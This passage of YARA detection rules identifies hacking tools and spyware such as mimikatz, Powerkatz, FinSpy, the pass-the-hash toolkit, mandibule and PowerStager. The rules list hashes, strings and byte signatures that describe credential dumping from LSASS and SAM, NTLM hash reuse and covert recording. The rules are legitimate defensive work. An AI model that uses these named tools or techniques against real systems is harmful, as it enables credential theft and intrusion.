ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule _hscan_hscan_hscangui {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - from files hscan.exe, hscan.exe, hscangui.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tsuper_rule = 1\n\t\thash0 = \"17a743e40790985ececf5c66eaad2a1f8c4cffe8\"\n\t\thash1 = \"568b06696ea0270ee1a744a5ac16418c8dacde1c\"\n\t\thash2 = \"af8aced0a78e1181f4c307c78402481a589f8d07\"\n\tstrings:\n\t\t$s1 = \".\\\\log\\\\Hscan.log\" fullword ascii\n\t\t$s2 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n\t\t$s3 = \"[%s]: checking \\\"FTP account: ftp/ftp@ftp.net\\\" ...\" fullword ascii\n\t\t$s4 = \"[%s]: IPC NULL session connection success !!!\" fullword ascii\n\t\t$s5 = \"Scan %d targets,use %4.1f minutes\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 240KB and all of them\n}\n\nrule kiwi_tools {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - from files kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, mimikatz.sys, sekurlsa.dll, kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, mimikatz.sys, sekurlsa.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tsuper_rule = 1\n\t\thash0 = \"e57e79f190f8a24ca911e6c7e008743480c08553\"\n\t\thash1 = \"55d5dabd96c44d16e41f70f0357cba1dda26c24f\"\n\t\thash2 = \"7ac7541e20af7755b7d8141c5c1b7432465cabd8\"\n\t\thash3 = \"9fbfe3eb49d67347ab57ae743f7542864bc06de6\"\n\t\thash4 = \"5c90d648c414bdafb549291f95fe6f27c0c9b5ec\"\n\t\thash5 = \"7addce4434670927c4efaa560524680ba2871d17\"\n\t\thash6 = \"28c5c0bdb7786dc2771672a2c275be7d9b742ec7\"\n\t\thash7 = \"b5c93489a1b62181594d0fb08cc510d947353bc8\"\n\t\thash8 = \"6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5\"\n\t\thash9 = \"5d578df9a71670aa832d1cd63379e6162564fb6b\"\n\t\thash10 = \"febadc01a64a071816eac61a85418711debaf233\"\n\t\thash11 = \"569ca4ff1a5ea537aefac4a04a2c588c566c6d86\"\n\t\thash12 = \"56a61c808b311e2225849d195bbeb69733efe49a\"\n\t\thash13 = \"8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16\"\n\t\thash14 = \"44825e848bc3abdb6f31d0a49725bb6f498e9ccc\"\n\t\thash15 = \"f661d6516d081c37ab7da0f4ec21b2cc6a9257c6\"\n\t\thash16 = \"20facf1fa2d87cccf177403ca1a7852128a9a0ab\"\n\t\thash17 = \"6e0ffa472d63fdda5abc4c1b164ba8724dcb25b5\"\n\tstrings:\n\t\t$s1 = \"http://blog.gentilkiwi.com/mimikatz\" ascii\n\t\t$s2 = \"Benjamin Delpy\" fullword ascii\n\t\t$s3 = \"GlobalSign\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule kiwi_tools_gentil_kiwi {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - from files kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, sekurlsa.dll, kappfree.dll, kelloworld.dll, KiwiCmd.exe, KiwiRegedit.exe, KiwiTaskmgr.exe, klock.dll, mimikatz.exe, sekurlsa.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\tsuper_rule = 1\n\t\thash0 = \"e57e79f190f8a24ca911e6c7e008743480c08553\"\n\t\thash1 = \"55d5dabd96c44d16e41f70f0357cba1dda26c24f\"\n\t\thash2 = \"7ac7541e20af7755b7d8141c5c1b7432465cabd8\"\n\t\thash3 = \"9fbfe3eb49d67347ab57ae743f7542864bc06de6\"\n\t\thash4 = \"5c90d648c414bdafb549291f95fe6f27c0c9b5ec\"\n\t\thash5 = \"7addce4434670927c4efaa560524680ba2871d17\"\n\t\thash6 = \"28c5c0bdb7786dc2771672a2c275be7d9b742ec7\"\n\t\thash7 = \"6acecd18fc7da1c5eb0d04e848aae9ce59d2b1b5\"\n\t\thash8 = \"5d578df9a71670aa832d1cd63379e6162564fb6b\"\n\t\thash9 = \"febadc01a64a071816eac61a85418711debaf233\"\n\t\thash10 = \"569ca4ff1a5ea537aefac4a04a2c588c566c6d86\"\n\t\thash11 = \"56a61c808b311e2225849d195bbeb69733efe49a\"\n\t\thash12 = \"8bd6c9f2e8be3e74bd83c6a2d929f8a69422fb16\"\n\t\thash13 = \"44825e848bc3abdb6f31d0a49725bb6f498e9ccc\"\n\t\thash14 = \"f661d6516d081c37ab7da0f4ec21b2cc6a9257c6\"\n\t\thash15 = \"6e0ffa472d63fdda5abc4c1b164ba8724dcb25b5\"\n\tstrings:\n\t\t$s1 = \"mimikatz\" fullword wide\n\t\t$s2 = \"Copyright (C) 2012 Gentil Kiwi\" fullword wide\n\t\t$s3 = \"Gentil Kiwi\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule dubrute : bruteforcer toolkit\n{\n    meta:\n        author = \"Christian Rebischke (@sh1bumi)\"\n        date = \"2015-09-05\"\n        description = \"Rules for DuBrute Bruteforcer\"\n        in_the_wild = true\n        family = \"Hackingtool/Bruteforcer\"\n    \n    strings:\n        $a = \"WBrute\"\n        $b = \"error.txt\"\n        $c = \"good.txt\"\n        $d = \"source.txt\"\n        $e = \"bad.txt\"\n        $f = \"Generator IP@Login;Password\"\n\n    condition:\n        //check for MZ Signature at offset 0\n        uint16(0) == 0x5A4D \n\n        and \n\n        //check for dubrute specific strings\n        $a and $b and $c and $d and $e and $f \n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\nimport \"pe\"\n\nrule FinSpy_2\n{\n    meta:\n        description = \"FinFisher FinSpy\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $password1 = /\\/scomma kbd101\\.sys/ wide ascii\n        $password2 = /(N)AME,EMAIL CLIENT,EMAIL ADDRESS,SERVER NAME,SERVER TYPE,USERNAME,PASSWORD,PROFILE/ wide ascii\n        $password3 = /\\/scomma excel2010\\.part/ wide ascii\n        $password4 = /(A)PPLICATION,PROTOCOL,USERNAME,PASSWORD/ wide ascii\n        $password5 = /\\/stab MSVCR32\\.manifest/ wide ascii\n        $password6 = /\\/scomma MSN2010\\.dll/ wide ascii\n        $password7 = /\\/scomma Firefox\\.base/ wide ascii\n        $password8 = /(I)NDEX,URL,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD,FILE,HTTP/ wide ascii\n        $password9 = /\\/scomma IE7setup\\.sys/ wide ascii\n        $password10 = /(O)RIGIN URL,ACTION URL,USERNAME FIELD,PASSWORD FIELD,USERNAME,PASSWORD,TIMESTAMP/ wide ascii\n        $password11 = /\\/scomma office2007\\.cab/ wide ascii\n        $password12 = /(U)RL,PASSWORD TYPE,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD/ wide ascii\n        $password13 = /\\/scomma outlook2007\\.dll/ wide ascii\n        $password14 = /(F)ILENAME,ENCRYPTION,VERSION,CRC,PASSWORD 1,PASSWORD 2,PASSWORD 3,PATH,SIZE,LAST MODIFICATION DATE,ERROR/ wide ascii\n\n        $screenrec1 = /(s)111o00000000\\.dat/ wide ascii\n        $screenrec2 = /(t)111o00000000\\.dat/ wide ascii\n        $screenrec3 = /(f)113o00000000\\.dat/ wide ascii\n        $screenrec4 = /(w)114o00000000\\.dat/ wide ascii\n        $screenrec5 = /(u)112Q00000000\\.dat/ wide ascii\n        $screenrec6 = /(v)112Q00000000\\.dat/ wide ascii\n        $screenrec7 = /(v)112O00000000\\.dat/ wide ascii\n\n        //$keylogger1 = /\\<%s UTC %s\\|%d\\|%s\\>/ wide ascii\n        //$keylogger2 = /1201[0-9A-F]{8}\\.dat/ wide ascii\n\n        $micrec = /2101[0-9A-F]{8}\\.dat/ wide ascii\n\n        $skyperec1 = /\\[%19s\\] %25s\\:    %s/ wide ascii\n        $skyperec2 = /Global\\\\\\{A48F1A32\\-A340\\-11D0\\-BC6B\\-00A0C903%\\.04X\\}/ wide\n        $skyperec3 = /(1411|1421|1431|1451)[0-9A-F]{8}\\.dat/ wide ascii\n\n        $mouserec1 = /(m)sc183Q000\\.dat/ wide ascii\n        $mouserec2 = /2201[0-9A-F]{8}\\.dat/ wide ascii\n\n        $driver = /\\\\\\\\\\\\\\\\\\.\\\\\\\\driverw/ wide ascii\n\n        $janedow1 = /(J)ane Dow\\'s x32 machine/ wide ascii\n        $janedow2 = /(J)ane Dow\\'s x64 machine/ wide ascii\n\n        $versions1 = /(f)inspyv2/ nocase\n        $versions2 = /(f)inspyv4/ nocase\n\n        $bootkit1 = /(b)ootkit_x32driver/\n        $bootkit2 = /(b)ootkit_x64driver/\n\n        $typo1 = /(S)creenShort Recording/ wide\n\n        $mssounddx = /(S)ystem\\\\CurrentControlSet\\\\Services\\\\mssounddx/ wide\n\n    condition:\n        8 of ($password*) or any of ($screenrec*) or $micrec or any of ($skyperec*) or any of ($mouserec*) or $driver or any of ($janedow*) or any of ($versions*) or any of ($bootkit*) or $typo1 or $mssounddx\n}\n\nrule FinSpy\n{\n    meta:\n        description = \"FinFisher FinSpy\"\n        author = \"AlienVault Labs\"\n\n    strings:\n        $filter1 = \"$password14\"\n        $filter2 = \"$screenrec7\"\n        $filter3 = \"$micrec\"\n        $filter4 = \"$skyperec3\"\n        $filter5 = \"$mouserec2\"\n        $filter6 = \"$driver\"\n        $filter7 = \"$janedow2\"\n        $filter8 = \"$bootkit2\"\n\n        $password1 = /\\/scomma kbd101\\.sys/ wide ascii\n        $password2 = /(N)AME,EMAIL CLIENT,EMAIL ADDRESS,SERVER NAME,SERVER TYPE,USERNAME,PASSWORD,PROFILE/ wide ascii\n        $password3 = /\\/scomma excel2010\\.part/ wide ascii\n        $password4 = /(A)PPLICATION,PROTOCOL,USERNAME,PASSWORD/ wide ascii\n        $password5 = /\\/stab MSVCR32\\.manifest/ wide ascii\n        $password6 = /\\/scomma MSN2010\\.dll/ wide ascii\n        $password7 = /\\/scomma Firefox\\.base/ wide ascii\n        $password8 = /(I)NDEX,URL,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD,FILE,HTTP/ wide ascii\n        $password9 = /\\/scomma IE7setup\\.sys/ wide ascii\n        $password10 = /(O)RIGIN URL,ACTION URL,USERNAME FIELD,PASSWORD FIELD,USERNAME,PASSWORD,TIMESTAMP/ wide ascii\n        $password11 = /\\/scomma office2007\\.cab/ wide ascii\n        $password12 = /(U)RL,PASSWORD TYPE,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD/ wide ascii\n        $password13 = /\\/scomma outlook2007\\.dll/ wide ascii\n        $password14 = /(F)ILENAME,ENCRYPTION,VERSION,CRC,PASSWORD 1,PASSWORD 2,PASSWORD 3,PATH,SIZE,LAST MODIFICATION DATE,ERROR/ wide ascii\n\n        $screenrec1 = /(s)111o00000000\\.dat/ wide ascii\n        $screenrec2 = /(t)111o00000000\\.dat/ wide ascii\n        $screenrec3 = /(f)113o00000000\\.dat/ wide ascii\n        $screenrec4 = /(w)114o00000000\\.dat/ wide ascii\n        $screenrec5 = /(u)112Q00000000\\.dat/ wide ascii\n        $screenrec6 = /(v)112Q00000000\\.dat/ wide ascii\n        $screenrec7 = /(v)112O00000000\\.dat/ wide ascii\n\n        //$keylogger1 = /\\<%s UTC %s\\|%d\\|%s\\>/ wide ascii\n        //$keylogger2 = /1201[0-9A-F]{8}\\.dat/ wide ascii\n\n        $micrec = /2101[0-9A-F]{8}\\.dat/ wide ascii\n\n        $skyperec1 = /\\[%19s\\] %25s\\:    %s/ wide ascii\n        $skyperec2 = /Global\\\\\\{A48F1A32\\-A340\\-11D0\\-BC6B\\-00A0C903%\\.04X\\}/ wide\n        //$skyperec3 = /(1411|1421|1431|1451)[0-9A-F]{8}\\.dat/ wide ascii\n\n        //$mouserec1 = /(m)sc183Q000\\.dat/ wide ascii\n        //$mouserec2 = /2201[0-9A-F]{8}\\.dat/ wide ascii\n\n        $driver = /\\\\\\\\\\\\\\\\\\.\\\\\\\\driverw/ wide ascii\n\n        $janedow1 = /(J)ane Dow\\'s x32 machine/ wide ascii\n        $janedow2 = /(J)ane Dow\\'s x64 machine/ wide ascii\n\n        //$versions1 = /(f)inspyv2/ nocase\n        //$versions2 = /(f)inspyv4/ nocase\n\n        $bootkit1 = /(b)ootkit_x32driver/\n        $bootkit2 = /(b)ootkit_x64driver/\n\n        $typo1 = /(S)creenShort Recording/ wide\n\n        $mssounddx = /(S)ystem\\\\CurrentControlSet\\\\Services\\\\mssounddx/ wide\n\n    condition:\n        (8 of ($password*) or any of ($screenrec*) or $micrec or any of ($skyperec*) or $driver or any of ($janedow*) or any of ($bootkit*) or $typo1 or $mssounddx) and not any of ($filter*)\n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n*/\n\n/*\n\tYara Rule Set\n\tAuthor: Florian Roth\n\tDate: 2016-02-05\n\tIdentifier: Powerkatz\n*/\n\nrule Powerkatz_DLL_Generic {\n\tmeta:\n\t\tdescription = \"Detects Powerkatz - a Mimikatz version prepared to run in memory via Powershell (overlap with other Mimikatz versions is possible)\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"PowerKatz Analysis\"\n\t\tdate = \"2016-02-05\"\n\t\tsuper_rule = 1\n\t\tscore = 80\n\t\thash1 = \"c20f30326fcebad25446cf2e267c341ac34664efad5c50ff07f0738ae2390eae\"\n\t\thash2 = \"1e67476281c1ec1cf40e17d7fc28a3ab3250b474ef41cb10a72130990f0be6a0\"\n\t\thash3 = \"49e7bac7e0db87bf3f0185e9cf51f2539dbc11384fefced465230c4e5bce0872\"\n\tstrings:\n\t\t$s1 = \"%3u - Directory '%s' (*.kirbi)\" fullword wide\n\t\t$s2 = \"%*s  pPublicKey         : \" fullword wide\n\t\t$s3 = \"ad_hoc_network_formed\" fullword wide\n\t\t$s4 = \"<3 eo.oe ~ ANSSI E>\" fullword wide\n\t\t$s5 = \"\\\\*.kirbi\" fullword wide\n\n\t\t$c1 = \"kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x%08x)\" fullword wide\n\t\t$c2 = \"kuhl_m_lsadump_getComputerAndSyskey ; kuhl_m_lsadump_getSyskey KO\" fullword wide\n\tcondition:\n\t\t( uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them ) or 2 of them\n}\n\n/* \t\tYara rule to detect ELF Linux process injector toolkit \"mandibule\" generic.\n   \t\tname: TOOLKIT_Mandibule.yar analyzed by unixfreaxjp. \n\t\tresult:\n\t\tTOOLKIT_Mandibule ./mandibule//mandibule-dynx86-stripped\n\t\tTOOLKIT_Mandibule ./mandibule//mandibule-dynx86-UNstripped\n\t\tTOOLKIT_Mandibule ./mandibule//mandibule-dun64-UNstripped\n\t\tTOOLKIT_Mandibule ./mandibule//mandibule-dyn64-stripped\n\n   \t\tThis Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) \n   \t\tand  open to any user or organization, as long as you use it under this license.\n*/\n\nprivate rule is__str_mandibule_gen1 {\n\tmeta:\n\t\tauthor = \"unixfreaxjp\"\n\t\tdate = \"2018-05-31\"\n\tstrings:\n\t\t$str01 = \"shared arguments too big\" fullword nocase wide ascii\n\t\t$str02 = \"self inject pid: %\" fullword nocase wide ascii\n\t\t$str03 = \"injected shellcode at 0x%lx\" fullword nocase wide ascii        \t\n\t\t$str04 = \"target pid: %d\" fullword nocase wide ascii        \t\n\t\t$str05 = \"mapping '%s' into memory at 0x%lx\" fullword nocase wide ascii\n\t\t$str06 = \"shellcode injection addr: 0x%lx\" fullword nocase wide ascii\n\t\t$str07 = \"loading elf at: 0x%llx\" fullword nocase wide ascii\n\tcondition:\n                4 of them\n}\n\nprivate rule is__hex_top_mandibule64 {\n\tmeta:\n\t\tauthor = \"unixfreaxjp\"\n\t\tdate = \"2018-05-31\"\n\tstrings:\n\t\t$hex01 = { 48 8D 05 43 01 00 00 48 89 E7 FF D0 } // st\n\t\t$hex02 = { 53 48 83 EC 50 48 89 7C 24 08 48 8B 44 24 08 } // mn\n\t\t$hex03 = { 48 81 EC 18 02 00 00 89 7C 24 1C 48 89 74 } // pt\n\t\t$hex04 = { 53 48 81 EC 70 01 01 00 48 89 7C 24 08 48 8D 44 24 20 48 05 00 00 } // ld\n\tcondition:\n                3 of them \n}\n\nprivate rule is__hex_mid_mandibule32 {\n\tmeta:\n\t\tauthor = \"unixfreaxjp\"\n\t\tdate = \"2018-06-01\"\n\tstrings:\n\t\t$hex05 = { E8 09 07 00 00 81 C1 FC 1F 00 00 8D 81 26 E1 FF FF } // st\n\t\t$hex06 = { 56 53 83 EC 24 E8 E1 05 00 00 81 C3 D0 1E 00 00 8B 44 24 30} // mn\n\t\t$hex07 = { 81 C3 E8 29 00 00 C7 44 24 0C } // pt\n\t\t$hex08 = { E8 C6 D5 FF FF 83 C4 0C 68 00 01 00 00 } // ld\n\tcondition:\n                3 of them \n}\n\nrule TOOLKIT_Mandibule {\n\tmeta:\n\t\tdescription = \"Generic detection for ELF Linux process injector mandibule generic\"\n\t\treference = \"https://imgur.com/a/MuHSZtC\"\n\t\tauthor = \"unixfreaxjp\"\n\t\torg = \"MalwareMustDie\"\n\t\tdate = \"2018-06-01\"\n\tcondition:\n\t\t((is__str_mandibule_gen1) or (is__hex_mid_mandibule32))\n\t\tor ((is__str_mandibule_gen1) or (is__hex_top_mandibule64))\n\t\tand is__elf\n\t\tand filesize < 30KB \n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\nrule whosthere_alt : Toolkit {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file whosthere-alt.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"9b4c3691872ca5adf6d312b04190c6e14dd9cbe10e94c0dd3ee874f82db897de\"\n\tstrings:\n\t\t$s0 = \"WHOSTHERE-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '49.00' */\n\t\t$s1 = \"whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */\n\t\t$s2 = \"dump output to a file, -o filename\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */\n\t\t$s3 = \"This tool lists the active LSA logon sessions with NTLM credentials.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00' */\n\t\t$s4 = \"Error: pth.dll is not in the current directory!.\" fullword ascii /* score: '24.00' */\n\t\t$s5 = \"the output format is: username:domain:lmhash:nthash\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */\n\t\t$s6 = \".\\\\pth.dll\" fullword ascii /* score: '16.00' */\n\t\t$s7 = \"Cannot get LSASS.EXE PID!\" fullword ascii /* score: '14.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 280KB and 2 of them\n}\n\nrule iam_alt_iam_alt : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file iam-alt.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"2ea662ef58142d9e340553ce50d95c1b7a405672acdfd476403a565bdd0cfb90\"\n\tstrings:\n\t\t$s0 = \"<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00' */\n\t\t$s1 = \"IAM-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '43.00' */\n\t\t$s2 = \"This tool allows you to change the NTLM credentials of the current logon session\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00' */\n\t\t$s3 = \"username:domainname:lmhash:nthash\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */\n\t\t$s4 = \"Error in cmdline!. Bye!.\" fullword ascii /* score: '12.00' */\n\t\t$s5 = \"Error: Cannot open LSASS.EXE!.\" fullword ascii /* score: '12.00' */\n\t\t$s6 = \"nthash is too long!.\" fullword ascii /* score: '8.00' */\n\t\t$s7 = \"LSASS HANDLE: %x\" fullword ascii /* score: '5.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 240KB and 2 of them\n}\n\nrule genhash_genhash : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file genhash.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"113df11063f8634f0d2a28e0b0e3c2b1f952ef95bad217fd46abff189be5373f\"\n\tstrings:\n\t\t$s1 = \"genhash.exe <password>\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */\n\t\t$s3 = \"Password: %s\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */\n\t\t$s4 = \"%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X\" fullword ascii /* score: '11.00' */\n\t\t$s5 = \"This tool generates LM and NT hashes.\" fullword ascii /* score: '10.00' */\n\t\t$s6 = \"(hashes format: LM Hash:NT hash)\" fullword ascii /* score: '10.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule iam_iamdll : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file iamdll.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"892de92f71941f7b9e550de00a57767beb7abe1171562e29428b84988cee6602\"\n\tstrings:\n\t\t$s0 = \"LSASRV.DLL\" fullword ascii /* score: '21.00' */\n\t\t$s1 = \"iamdll.dll\" fullword ascii /* score: '21.00' */\n\t\t$s2 = \"ChangeCreds\" fullword ascii /* score: '12.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 115KB and all of them\n}\n\nrule iam_iam : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file iam.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"8a8fcce649259f1b670bb1d996f0d06f6649baa8eed60db79b2c16ad22d14231\"\n\tstrings:\n\t\t$s1 = \"<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00' */\n\t\t$s2 = \"iam.exe -h administrator:mydomain:\"  ascii /* PEStudio Blacklist: strings */ /* score: '40.00' */\n\t\t$s3 = \"An error was encountered when trying to change the current logon credentials!.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00' */\n\t\t$s4 = \"optional parameter. If iam.exe crashes or doesn't work when run in your system, use this parameter.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */\n\t\t$s5 = \"IAM.EXE will try to locate some memory locations instead of using hard-coded values.\" fullword ascii /* score: '26.00' */\n\t\t$s6 = \"Error in cmdline!. Bye!.\" fullword ascii /* score: '12.00' */\n\t\t$s7 = \"Checking LSASRV.DLL....\" fullword ascii /* score: '12.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule whosthere_alt_pth : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file pth.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"fbfc8e1bc69348721f06e96ff76ae92f3551f33ed3868808efdb670430ae8bd0\"\n\tstrings:\n\t\t$s0 = \"c:\\\\debug.txt\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00' */\n\t\t$s1 = \"pth.dll\" fullword ascii /* score: '20.00' */\n\t\t$s2 = \"\\\"Primary\\\" string found at %.8Xh\" fullword ascii /* score: '7.00' */\n\t\t$s3 = \"\\\"Primary\\\" string not found!\" fullword ascii /* score: '6.00' */\n\t\t$s4 = \"segment 1 found at %.8Xh\" fullword ascii /* score: '6.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 240KB and 4 of them\n}\n\nrule whosthere : Toolkit  {\n\tmeta:\n\t\tdescription = \"Auto-generated rule - file whosthere.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n\t\tdate = \"2015-07-10\"\n\t\tscore = 80\n\t\thash = \"d7a82204d3e511cf5af58eabdd6e9757c5dd243f9aca3999dc0e5d1603b1fa37\"\n\tstrings:\n\t\t$s1 = \"by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '48.00' */\n\t\t$s2 = \"whosthere enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00' */\n\t\t$s3 = \"specify addresses to use. Format: ADDCREDENTIAL_ADDR:ENCRYPTMEMORY_ADDR:FEEDBACK_ADDR:DESKEY_ADDR:LOGONSESSIONLIST_ADDR:LOGONSES\" ascii /* PEStudio Blacklist: strings */ /* score: '28.00' */\n\t\t$s4 = \"Could not enable debug privileges. You must run this tool with an account with administrator privileges.\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */\n\t\t$s5 = \"-B is now used by default. Trying to find correct addresses..\" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.00' */\n\t\t$s6 = \"Cannot get LSASS.EXE PID!\" fullword ascii /* score: '14.00' */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 320KB and 2 of them\n}\n\nrule Powerstager\n{\n    meta:\n      author = \"Jeff White - jwhite@paloaltonetworks.com @noottrak\"\n      date = \"02JAN2018\"\n      hash1 = \"758097319d61e2744fb6b297f0bff957c6aab299278c1f56a90fba197795a0fa\" //x86\n      hash2 = \"83e714e72d9f3c500cad610c4772eae6152a232965191f0125c1c6f97004b7b5\" //x64\n      description = \"Detects PowerStager Windows executable, both x86 and x64\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-powerstager-analysis/\"\n      reference2 = \"https://github.com/z0noxz/powerstager\"\n    \n    strings:\n      $filename = /%s\\\\[a-zA-Z0-9]{12}/\n      $pathname = \"TEMP\" wide ascii\n//    $errormsg = \"The version of this file is not compatible with the version of Windows you're running.\" wide ascii\n      $filedesc = \"Lorem ipsum dolor sit amet, consecteteur adipiscing elit\" wide ascii\n      $apicall_01 = \"memset\"\n      $apicall_02 = \"getenv\"\n      $apicall_03 = \"fopen\"\n      $apicall_04 = \"memcpy\"\n      $apicall_05 = \"fwrite\"\n      $apicall_06 = \"fclose\"\n      $apicall_07 = \"CreateProcessA\"\n      $decoder_x86_01 = { 8D 95 [4] 8B 45 ?? 01 D0 0F B6 18 8B 4D ?? }\n      $decoder_x86_02 = { 89 C8 0F B6 84 05 [4] 31 C3 89 D9 8D 95 [4] 8B 45 ?? 01 D0 88 08 83 45 [2] 8B 45 ?? 3D }\n      $decoder_x64_01 = { 8B 85 [4] 48 98 44 0F [7] 8B 85 [4] 48 63 C8 48 }\n      $decoder_x64_02 = { 48 89 ?? 0F B6 [3-6] 44 89 C2 31 C2 8B 85 [4] 48 98 }\n\n    condition:\n      uint16be(0) == 0x4D5A\n        and\n      all of ($apicall_*)\n        and\n      $filename\n        and\n      $pathname\n        and\n      $filedesc\n        and\n      (2 of ($decoder_x86*) or 2 of ($decoder_x64*))\n}\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\nrule QuarksPwDump_Gen : Toolkit  {\n\tmeta:\n\t\tdescription = \"Detects all QuarksPWDump 